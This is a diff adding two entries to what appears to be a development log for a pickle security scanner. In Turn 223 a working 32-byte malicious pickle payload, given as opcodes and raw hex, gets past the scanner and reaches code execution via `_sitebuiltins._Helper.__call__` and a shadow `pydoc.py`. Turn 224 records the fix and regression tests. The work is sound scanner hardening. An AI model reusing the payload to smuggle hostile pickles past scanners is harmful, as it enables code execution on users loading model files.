@@ -12960,3 +12960,185 @@ Performance note:
 - The wrapper search remains bounded by the existing call count, depth, visited
   function, and source-size caps.
 - Warm scan median for the fixed 25-byte payload was `0.000074s` over 50 runs.
+
+## Turn 223 - Bypass via callable `_sitebuiltins._Helper` instance import
+
+Found a scanner-clean RCE-capable bypass in callable class instances. The
+payload imports `_sitebuiltins._Helper`, constructs an instance, then immediately
+uses a second `REDUCE` to call that instance. At runtime this enters
+`_Helper.__call__()`, which performs a function-body `import pydoc`. A shadow
+`pydoc.py` at the front of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL _sitebuiltins _Helper
+EMPTY_TUPLE
+REDUCE              # construct _Helper()
+EMPTY_TUPLE
+REDUCE              # call the constructed helper instance
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0d5f736974656275696c74696e738c075f48656c70657293295229522e
+```
+
+Scanner proof:
+
+```text
+payload_len 32
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': '_sitebuiltins', 'name': '_Helper', 'is_dangerous': False}
+)
+invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'positional_arg_count': 0, 'opcode_position': 28},
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'positional_arg_count': 0, 'opcode_position': 30}
+)
+entry ('_sitebuiltins._Helper.__call__',)
+calls ('pydoc.help', 'builtins.__import__')
+path helper None
+path call None
+dangerous ()
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'shadow-help'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and exposed a minimal
+`help()` function returning `"shadow-help"`.
+
+Why it bypasses:
+
+- Native policy does not mark `_sitebuiltins._Helper` as dangerous.
+- The Python call graph resolves `_sitebuiltins._Helper` to the class
+  `__call__` entrypoint, and `_Helper.__call__` sees both `pydoc.help` and
+  `builtins.__import__`.
+- Turn 222 intentionally disabled import-execution fallback for broad
+  non-lifecycle class entrypoints such as `__call__`, because mere class
+  construction must not imply that the instance is called.
+- This payload does call the instance, but the native metadata records the
+  second `REDUCE` as another `_sitebuiltins._Helper` invocation rather than a
+  concrete `_sitebuiltins._Helper.__call__` invocation. The arity-aware
+  import-execution pass therefore never enables fallback for the entered
+  `__call__` method.
+- A direct dotted `_Helper.__call__` payload also reaches the sink, but it
+  contains the literal magic-method name and trips a generic suspicious-string
+  warning. The callable-instance variant avoids that string entirely and scans
+  clean.
+
+Likely source-level defense:
+
+- Track reducer outputs that are instances of imported classes and, when a
+  later `REDUCE` invokes that object, emit callable invocation metadata for the
+  class `__call__` method with the supplied argument count.
+- Alternatively, in the Python call-graph layer, treat a repeated callable
+  invocation of an imported class value as evidence that `Class.__call__` was
+  entered, then allow the same import-execution fallback used for directly
+  entered functions.
+- Keep the Turn 222 distinction: class construction alone should not enable
+  broad `__call__` import fallbacks.
+
+Performance note:
+
+- Payload size is 32 bytes.
+- Warm scan median over 50 runs was `0.000049s` with max `0.001169s`.
+- The exploit uses only one import reference and two `REDUCE` opcodes, so it
+  does not stress the call-graph reference limit.
+
+## Turn 224 - Defense for constructed callable instance invocations
+
+Implemented the source-level block for Turn 223. The native stack model now
+distinguishes a reducer call whose callable operand is a constructed object:
+`REDUCE`/`OBJ` on `Constructed(Foo)` emits callable invocation metadata for
+`Foo.__call__` instead of another constructor-like `Foo` invocation. The Python
+call-graph pass then analyzes invocation-only references, while keeping the
+Turn 222 boundary that class construction alone does not imply broad
+non-lifecycle method execution.
+
+Fix details:
+
+- In the Rust scanner, `consume_callable_opcode()` now maps constructed
+  callable operands under `REDUCE`/`OBJ` to `Class.__call__` metadata and keeps
+  `BUILD`/constructor-style opcodes on the constructed object itself.
+- In the Python call graph, invocation-only references are merged with import
+  references for analysis. This lets `_sitebuiltins._Helper.__call__` be
+  analyzed even though the pickle imports only `_sitebuiltins._Helper`.
+- Non-lifecycle import-execution fallback remains disabled for plain class
+  imports. It is enabled only when the reference itself is an explicit method
+  reference, such as the native scanner's new `Class.__call__` invocation
+  metadata.
+
+Regression coverage:
+
+- `test_call_graph_models_constructed_callable_instance_invocations` verifies
+  that `_sitebuiltins._Helper()` construction alone stays clean, while explicit
+  `_sitebuiltins._Helper.__call__` invocation metadata reaches
+  `builtins.__import__`.
+- `test_scan_bytes_blocks_sitebuiltins_helper_callable_instance_import_rce`
+  scans the Turn 223 32-byte payload as malicious, verifies the native metadata
+  includes `_Helper.__call__`, and executes the payload in a child interpreter
+  with a shadow `pydoc.py`.
+- Re-ran the existing `click.utils.LazyFile` startup-hook regression to ensure
+  constructor analysis still does not overreport unrelated class entrypoints.
+
+Post-fix proof:
+
+```text
+payload_len 32
+scan malicious complete findings 1
+callable_invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'opcode_position': 28, 'positional_arg_count': 0},
+  {'module': '_sitebuiltins', 'name': '_Helper.__call__',
+   'opcode_position': 30, 'positional_arg_count': 0}
+)
+call_graph [{'module': '_sitebuiltins', 'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__',
+                'builtins.__import__')}]
+dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+warm_median 0.000101
+warm_max 0.000779
+```
+
+Validation:
+
+- Rebuilt local Rust extension with
+  `uv tool run maturin develop -m packages/modelaudit-picklescan/Cargo.toml`.
+- Focused import/call-graph regression file: `17 passed in 0.74s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in 1.21s`.
+- Focused call-graph suite: `55 passed in 2.39s`.
+- Rust unit tests: `78 passed`.
+- `ruff format`: `1 file reformatted, 391 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3732 passed, 1022 skipped, 21 warnings in 51.80s`.
+
+Performance note:
+
+- The native change adds no additional source parsing; it only labels the
+  existing callable operand more precisely when the stack value is
+  `Constructed`.
+- The Python call-graph pass now considers invocation-only references, still
+  bounded by the existing `_MAX_IMPORT_REFERENCES` cap.
+- Warm scan median for the fixed 32-byte payload was `0.000101s` over 50 runs.
